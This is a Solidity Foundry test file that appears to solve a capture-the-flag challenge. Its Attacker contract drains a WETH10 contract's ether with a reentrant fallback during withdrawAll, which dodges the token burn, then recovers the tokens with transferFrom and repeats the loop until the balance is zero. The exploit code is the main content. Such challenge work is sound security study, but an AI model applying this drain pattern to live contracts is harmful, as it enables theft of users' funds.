pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {WETH10} from "../src/WETH10.sol";
contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        
        vm.startPrank(bob);
        Attacker _attacker= new Attacker(payable(weth));
        weth.approve(address(_attacker),type(uint256).max);
        console.log("allowance for attacker contract : ", weth.allowance(address(this),address(_attacker)));

        _attacker.deposit{value:1 ether}();
        _attacker.pwn();
        _attacker.getEther();
        console.log("balance of Bob   after the attack : ", address(bob).balance);

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract Attacker{
    address owner;
    WETH10 public weth10;
    constructor(address  payable _weth10){
        owner = msg.sender;
        weth10 = WETH10(_weth10);
        weth10.approve(address(owner),type(uint256).max);
    }
    function deposit() public payable {
    }

    //We will manipulate our balance of WETH10. In order to withdraw 1 ether with withdrawAll and burn 0 token in _burnAll()
    function pwn() public  {
        while(address(weth10).balance!=0){
            require(address(this).balance > 0);
            //Deposit 1 ether -> get 1 WETH10
            payable(weth10).call{value : 1 ether}(abi.encodeWithSelector(bytes4(keccak256("deposit()"))));
            console.log("balance of attacker   before withdraw : ", address(this).balance);
            //Withdraw 1 ether and burn 0 WETH10 token
            weth10.withdrawAll();
            console.log("balance of attacker   after withdraw : ", address(this).balance);
            //Get back our WETH10 token from Bob
            weth10.transferFrom(owner,address(this),weth10.balanceOf(address(owner)));
        }
    }

    //Send ethers to Bob
    function getEther() public {
        owner.call{value:address(this).balance}("");
        }
    //We transfer our ERC20 token in order to have our balance to 0
    fallback() external payable {
        weth10.transfer(owner,weth10.balanceOf(address(this)));
    }
}